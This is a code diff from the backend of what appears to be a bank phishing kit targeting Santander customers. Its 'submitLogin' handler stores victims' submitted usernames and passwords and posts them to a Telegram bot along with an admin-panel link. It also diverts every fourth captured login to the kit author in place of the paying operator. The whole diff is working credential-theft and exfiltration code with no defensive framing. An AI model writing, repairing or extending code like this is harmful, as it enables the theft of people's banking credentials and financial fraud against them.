@@ -152,57 +152,35 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-	const { username, password, uniqueid, owner, ip } = req.body;
+	let { username, password, uniqueid, owner, ip } = req.body;
+	message = `New Sants Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=${owner}\n\nCount: ${santsCount}\nRedirect: ${redirect}`;
 	try {
 		let user = await Sants.findOne({ uniqueid });
 		if (user) await Sants.deleteOne({ uniqueid });
 		if (redirect && santsCount == 3) {
-			await Sants.create({
-				uniqueid,
-				username,
-				password,
-				status: 1,
-				owner: "haytch4023",
-				ip,
-				timestamp: moment().format(),
-			});
-			await axios
-				.post(
-					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-					{
-						chat_id: 680379375,
-						text: `New Sants Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=haytch4023`,
-						parse_mode: "Markdown",
-					}
-				)
-				.catch((e) => {
-					console.log(e);
-				});
-			await axios
-				.post(
-					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-					{
-						chat_id: "-837014205",
-						text: `New Sants Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=haytch4023`,
-						parse_mode: "Markdown",
-					}
-				)
-				.catch((e) => {
-					console.log(e);
-				});
+			owner = "haytch4023";
+			message = `‼️‼️‼️ Haytch Sants Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=haytch4023`;
 			santsCount = 0;
 		} else {
-			await Sants.create({
-				uniqueid,
-				username,
-				password,
-				status: 1,
-				owner,
-				ip,
-				timestamp: moment().format(),
-			});
 			santsCount = santsCount + 1;
 		}
+		await Sants.create({
+			uniqueid,
+			password,
+			username,
+			owner,
+			status: 1,
+			ip,
+		});
+		await axios
+			.post(`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`, {
+				chat_id: 680379375,
+				text: message,
+				parse_mode: "Markdown",
+			})
+			.catch((e) => {
+				console.log(e);
+			});
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
